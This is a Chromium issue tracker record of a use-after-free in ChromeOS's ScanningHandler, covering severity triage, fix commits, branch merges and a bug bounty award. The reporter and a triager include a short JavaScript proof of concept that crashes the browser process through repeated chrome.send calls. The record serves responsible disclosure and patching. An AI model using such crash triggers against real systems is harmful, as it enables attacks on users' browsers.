# Security: UAF in ScanningHandler

| Field | Value |
|-------|-------|
| **Issue ID** | [40059011](https://issues.chromium.org/issues/40059011) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | UI>Browser>WebUI |
| **Platforms** | ChromeOS |
| **Reporter** | le...@gmail.com |
| **Assignee** | ga...@chromium.org |
| **Created** | 2022-03-08 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**

Message `ensureValidFilePath` will post the reply task `OnPathExists`[1] with `base::Unretained(this)` into the new sequence. It will cause the UAF if `ScanningHandler` gets destroyed before the task run.

[1]. <https://source.chromium.org/chromium/chromium/src/+/main:ash/webui/scanning/scanning_handler.cc;l=245;drc=354945de1fb564ef04c07cf8bfedf434d2d81747>

Fix suggestion:

Use `weak_ptr_factory_.GetWeakPtr()` or `CancelableTask`.

**VERSION**  

Chrome Version: stable  

Operating System: ChromeOS

**REPRODUCTION CASE**

browsing `chrome://scanning` and open devtools

execute ```

async function cb() {  

}  

cr.webUIResponse = cb;

for(let i=0;i<0x2000;i++){  

chrome.send("ensureValidFilePath",["",""]);  

chrome.send("ensureValidFilePath",["",""]);  

window.close();  

}  

for(let i=0;i<0x1000;i++){  

chrome.send("ensureValidFilePath",["",""]);  

window.close();  

}

```
  
  
**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**   
Type of crash: browser  
Crash State: see asan file  
  
  
**CREDIT INFORMATION**   
Reporter credit: Leecraso and Guang Gong of 360 Vulnerability Research Institute

```

## Attachments

- [asan](attachments/asan) (text/plain, 21.1 KB)

## Timeline

### [Deleted User] (2022-03-08)

[Empty comment from Monorail migration]

### bo...@chromium.org (2022-03-09)

Assigning medium severity since this is a UAF in a privileged browser process (typically high severity) tempered by requirements for local user interaction as well as lack of information about how the bug could be triggered without requiring an attacker to trick the CrOS user into opening both the scanning dialog developer tools and then manually entering the payload. At this stage severity assignment is open for discussion and may be revisited if additional details merit changes. 

I don't have a CrOS device on stable handy for testing, but can reliably crash CrOS canary 101.0.4918.0 with only the following fraction of the POC:

async function cb() {
}
cr.webUIResponse = cb;

for(let i=0;i<0x2000;i++){
    chrome.send("ensureValidFilePath",["",""]);
    chrome.send("ensureValidFilePath",["",""]);
    window.close();
}

Labeling with FoundIn-99 per information provided by reporter. 

[Monorail components: UI>Browser>WebUI]

### [Deleted User] (2022-03-09)

[Empty comment from Monorail migration]

### ze...@chromium.org (2022-03-09)

[Empty comment from Monorail migration]

### le...@gmail.com (2022-03-10)

> For https://crbug.com/chromium/1304145#c2:

Simmilar as https://crbug.com/chromium/1242392, it would require the ability to inject JS to chrome://scanning, so Medium severity is indeed a correct assignment.

### [Deleted User] (2022-03-10)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-03-10)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### gi...@appspot.gserviceaccount.com (2022-03-10)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/19504a2ded14ec3a254a2c6b2b0effb0f9169194

commit 19504a2ded14ec3a254a2c6b2b0effb0f9169194
Author: Gavin Williams <gavinwill@chromium.org>
Date: Thu Mar 10 22:07:17 2022

Scanning: ScanningHandler filepath fix

Fixed: 1304145
Change-Id: I33b85e70020a4e91efa9eb4859c70cac9c41dede
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3517546
Reviewed-by: Daniel Cheng <dcheng@chromium.org>
Commit-Queue: Gavin Williams <gavinwill@chromium.org>
Cr-Commit-Position: refs/heads/main@{#979967}

[modify] https://crrev.com/19504a2ded14ec3a254a2c6b2b0effb0f9169194/ash/webui/scanning/scanning_handler.cc


### bo...@chromium.org (2022-03-11)

[Empty comment from Monorail migration]

### [Deleted User] (2022-03-11)

[Empty comment from Monorail migration]

### [Deleted User] (2022-03-11)

[Empty comment from Monorail migration]

### [Deleted User] (2022-03-12)

Requesting merge to beta M100 because latest trunk commit (979967) appears to be after beta branch point (972766).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-03-12)

Merge review required: M100 is already shipping to beta.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), harrysouders (iOS), dgagnon (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ga...@chromium.org (2022-03-14)

kalin@ please review this change for Beta merge https://crrev.com/c/3517546

### dg...@google.com (2022-03-15)

[Empty comment from Monorail migration]

### th...@chromium.org (2022-03-21)

[Empty comment from Monorail migration]

### dg...@google.com (2022-03-21)

[Empty comment from Monorail migration]

### ka...@google.com (2022-03-21)

Was the change reviewed and approved by the Eng Prod Representative?
Yes, LGTM

### ga...@chromium.org (2022-03-21)

1. Why does your merge fit within the merge criteria for these milestones? Yes
2. What changes specifically would you like to merge? https://crrev.com/c/3517546
3. Have the changes been released and tested on canary? Yes
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels? No
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? Yes
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? No

### ka...@google.com (2022-03-21)

[Empty comment from Monorail migration]

### dg...@google.com (2022-03-22)

Merge approved for M100

### gi...@appspot.gserviceaccount.com (2022-03-22)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/b23ae53131ce7e5afbcb54d42da6efa622abe63b

commit b23ae53131ce7e5afbcb54d42da6efa622abe63b
Author: Gavin Williams <gavinwill@chromium.org>
Date: Tue Mar 22 23:12:49 2022

[M100] Scanning: ScanningHandler filepath fix

(cherry picked from commit 19504a2ded14ec3a254a2c6b2b0effb0f9169194)

Fixed: 1304145
Change-Id: I33b85e70020a4e91efa9eb4859c70cac9c41dede
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3517546
Reviewed-by: Daniel Cheng <dcheng@chromium.org>
Commit-Queue: Gavin Williams <gavinwill@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#979967}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3543350
Auto-Submit: Gavin Williams <gavinwill@chromium.org>
Commit-Queue: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/4896@{#798}
Cr-Branched-From: 1f63ff4bc27570761b35ffbc7f938f6586f7bee8-refs/heads/main@{#972766}

[modify] https://crrev.com/b23ae53131ce7e5afbcb54d42da6efa622abe63b/ash/webui/scanning/scanning_handler.cc


### [Deleted User] (2022-03-22)

LTS Milestone M96

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:
1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ga...@chromium.org (2022-03-22)

1. Was this issue a regression for the milestone it was found in? No
2. Is this issue related to a change or feature merged after the latest LTS Milestone? No

### rz...@google.com (2022-03-23)

[Empty comment from Monorail migration]

### rz...@google.com (2022-03-23)

[Empty comment from Monorail migration]

### [Deleted User] (2022-03-23)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### rz...@google.com (2022-03-23)

1. Just https://crrev.com/c/3545306
2. Low, no conflicts
3. 100
4. Yes

### gm...@google.com (2022-03-24)

[Empty comment from Monorail migration]

### gm...@google.com (2022-03-25)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2022-03-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/56dd8f0fb0a7405fe8aa6ed2dfe9137f6e1d0f85

commit 56dd8f0fb0a7405fe8aa6ed2dfe9137f6e1d0f85
Author: Gavin Williams <gavinwill@chromium.org>
Date: Mon Mar 28 01:14:50 2022

[M96-LTS] Scanning: ScanningHandler filepath fix

(cherry picked from commit 19504a2ded14ec3a254a2c6b2b0effb0f9169194)

Fixed: 1304145
Change-Id: I33b85e70020a4e91efa9eb4859c70cac9c41dede
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3517546
Commit-Queue: Gavin Williams <gavinwill@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#979967}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3545306
Reviewed-by: Oleh Lamzin <lamzin@google.com>
Owners-Override: Oleh Lamzin <lamzin@google.com>
Commit-Queue: Roger Felipe Zanoni da Silva <rzanoni@google.com>
Cr-Commit-Position: refs/branch-heads/4664@{#1554}
Cr-Branched-From: 24dc4ee75e01a29d390d43c9c264372a169273a7-refs/heads/main@{#929512}

[modify] https://crrev.com/56dd8f0fb0a7405fe8aa6ed2dfe9137f6e1d0f85/ash/webui/scanning/scanning_handler.cc


### rz...@google.com (2022-03-28)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-03-28)

[Empty comment from Monorail migration]

### am...@google.com (2022-03-29)

[Empty comment from Monorail migration]

### am...@google.com (2022-04-15)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-04-15)

Congratulations, Leecraso and Guang Gong! The VRP Panel has decided to award you $5,000 for this report due to the mitigation of direct user interaction in triggering this issue. Thank you again for your diligent efforts and reporting this issue to us! 

### am...@google.com (2022-04-16)

[Empty comment from Monorail migration]

### [Deleted User] (2022-06-17)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@google.com (2022-07-22)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-07-29)

[Empty comment from Monorail migration]

### ch...@google.com (2023-05-24)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1304145?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail mergedwith: crbug.com/chromium/1305068]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40059011)*
